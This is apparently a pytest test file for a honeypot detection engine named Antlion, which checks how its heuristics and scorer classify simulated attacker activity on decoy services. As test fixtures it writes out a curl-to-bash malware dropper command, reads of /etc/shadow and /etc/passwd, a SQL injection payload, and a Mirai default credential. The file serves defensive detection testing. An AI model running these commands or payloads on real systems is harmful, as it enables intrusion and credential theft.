"""
Tests for Antlion's Verdict Engine, Multi-Signal Scorer, and Behavioral Heuristics.
"""

import tempfile
from pathlib import Path

import pytest

from antlion.core.config import AntlionConfig
from antlion.core.types import (
    AttackCategory,
    DecoyEvent,
    DecoyServiceType,
    InteractionDepth,
    MLPrediction,
    SeverityLevel,
)
from antlion.storage.database import AntlionDatabase
from antlion.verdict.engine import VerdictEngine
from antlion.verdict.heuristics import BehavioralHeuristicsEngine
from antlion.verdict.scoring import MultiSignalScorer


@pytest.fixture
def temp_db():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        db = AntlionDatabase(tmp.name)
        yield db


@pytest.fixture
def verdict_engine(temp_db):
    config = AntlionConfig()
    return VerdictEngine(config=config, db=temp_db)


def test_shallow_connection_probe():
    scorer = MultiSignalScorer()
    heuristics = BehavioralHeuristicsEngine()

    event = DecoyEvent(
        source_ip="192.168.1.100",
        source_port=54321,
        target_service=DecoyServiceType.SSH,
        depth=InteractionDepth.CONNECTION_PROBE,
    )

    matches = heuristics.evaluate_event(event)
    verdict = scorer.evaluate(decoy_event=event, heuristic_matches=matches)

    assert verdict.attack_type == AttackCategory.RECON_SCAN
    assert verdict.severity == SeverityLevel.LOW
    assert 0.35 <= verdict.confidence <= 0.65
    assert verdict.contributing_signals.depth_multiplier < 0.70


def test_known_botnet_credential_attack():
    scorer = MultiSignalScorer()
    heuristics = BehavioralHeuristicsEngine()

    event = DecoyEvent(
        source_ip="45.33.32.156",
        source_port=41234,
        target_service=DecoyServiceType.TELNET,
        depth=InteractionDepth.AUTHENTICATION_ATTEMPT,
        username="root",
        password="vizkey",  # Mirai signature
    )

    matches = heuristics.evaluate_event(event)
    assert any(m.rule_id == "RULE_KNOWN_BOTNET_CRED" for m in matches)

    verdict = scorer.evaluate(decoy_event=event, heuristic_matches=matches)
    assert verdict.attack_type == AttackCategory.BOTNET_PROBE
    assert verdict.severity in (SeverityLevel.HIGH, SeverityLevel.CRITICAL)
    assert verdict.confidence > 0.75


def test_command_injection_and_dropper():
    scorer = MultiSignalScorer()
    heuristics = BehavioralHeuristicsEngine()

    event = DecoyEvent(
        source_ip="185.220.101.5",
        source_port=39281,
        target_service=DecoyServiceType.SSH,
        depth=InteractionDepth.INTERACTIVE_COMMANDS,
        username="root",
        commands=[
            "uname -a",
            "curl -s http://185.220.101.5/malware.sh | bash",
            "cat /etc/shadow",
        ],
    )

    matches = heuristics.evaluate_event(event)
    rule_ids = {m.rule_id for m in matches}
    assert "CMD_DROPPER_DOWNLOAD" in rule_ids
    assert "CMD_CRED_RECON" in rule_ids

    verdict = scorer.evaluate(decoy_event=event, heuristic_matches=matches)
    assert verdict.attack_type == AttackCategory.MALWARE_DROPPER
    assert verdict.severity == SeverityLevel.CRITICAL
    assert verdict.confidence >= 0.85


def test_web_exploit_with_scanner_ua():
    scorer = MultiSignalScorer()
    heuristics = BehavioralHeuristicsEngine()

    event = DecoyEvent(
        source_ip="103.200.1.20",
        source_port=48920,
        target_service=DecoyServiceType.WEB_ADMIN,
        depth=InteractionDepth.WEB_EXPLOIT_PAYLOAD,
        http_method="GET",
        http_path="/api/v1/debug?query=1' UNION SELECT null, username, password FROM users--",
        http_headers={"User-Agent": "sqlmap/1.6#stable (https://sqlmap.org)"},
    )

    matches = heuristics.evaluate_event(event)
    rule_ids = {m.rule_id for m in matches}
    assert "RULE_SCANNER_UA" in rule_ids
    assert "WEB_SQL_INJECTION" in rule_ids

    # Provide ML model prediction agreeing with web exploit
    ml_pred = MLPrediction(
        model_name="RandomForestClassifier",
        predicted_category="WebAttack",
        confidence=0.92,
        probabilities={"WebAttack": 0.92, "Benign": 0.08},
    )

    verdict = scorer.evaluate(
        decoy_event=event, heuristic_matches=matches, ml_prediction=ml_pred
    )
    assert verdict.attack_type == AttackCategory.WEB_EXPLOIT
    assert verdict.severity == SeverityLevel.CRITICAL
    assert verdict.confidence >= 0.88
    assert verdict.contributing_signals.congruence_factor > 0.0


def test_evasion_detection_ml_override():
    scorer = MultiSignalScorer()
    heuristics = BehavioralHeuristicsEngine()

    # Stealthy flow causes ML model to predict Benign
    ml_benign = MLPrediction(
        model_name="RandomForestClassifier",
        predicted_category="Benign",
        confidence=0.89,
        probabilities={"Benign": 0.89, "Infiltration": 0.11},
    )

    # However, decoy ground truth caught interactive shell execution
    event = DecoyEvent(
        source_ip="198.51.100.22",
        source_port=60000,
        target_service=DecoyServiceType.SSH,
        depth=InteractionDepth.INTERACTIVE_COMMANDS,
        username="admin",
        commands=["id", "uname -a", "cat /etc/passwd"],
    )

    matches = heuristics.evaluate_event(event)
    verdict = scorer.evaluate(
        decoy_event=event, heuristic_matches=matches, ml_prediction=ml_benign
    )

    # Ground truth overrides ML false negative
    assert verdict.attack_type == AttackCategory.EVASIVE_INTRUSION
    assert verdict.severity in (SeverityLevel.HIGH, SeverityLevel.CRITICAL)
    assert verdict.raw_evidence["evasion_detected"] is True


def test_heuristic_accumulator_saturation():
    scorer = MultiSignalScorer()
    from antlion.core.types import HeuristicMatch

    m1 = [HeuristicMatch("r1", "rule 1", 0.8, SeverityLevel.HIGH, "")]
    m2 = [
        HeuristicMatch("r1", "rule 1", 0.8, SeverityLevel.HIGH, ""),
        HeuristicMatch("r2", "rule 2", 0.8, SeverityLevel.HIGH, ""),
    ]

    s1 = scorer._accumulate_heuristics(m1)
    s2 = scorer._accumulate_heuristics(m2)

    # s1 = 0.8, s2 = 1 - (0.2 * 0.2) = 0.96
    assert s1 == 0.8
    assert s2 == 0.96
    assert s2 > s1
    assert s2 <= 1.0


def test_verdict_engine_end_to_end(verdict_engine):
    event = DecoyEvent(
        source_ip="203.0.113.55",
        source_port=51234,
        target_service=DecoyServiceType.SSH,
        depth=InteractionDepth.AUTHENTICATION_ATTEMPT,
        username="admin",
        password="password",
    )

    verdict = verdict_engine.process_decoy_event(event)
    assert verdict.verdict_id is not None
    assert verdict.source_ip == "203.0.113.55"

    # Query recent verdicts from DB
    verdicts = verdict_engine.get_recent_verdicts(source_ip="203.0.113.55")
    assert len(verdicts) == 1
    assert verdicts[0]["verdict_id"] == verdict.verdict_id

    # Query IP threat intelligence
    intel = verdict_engine.get_ip_intel("203.0.113.55")
    assert intel["source_ip"] == "203.0.113.55"
    assert intel["total_verdicts"] == 1
    assert intel["total_decoy_hits"] == 1
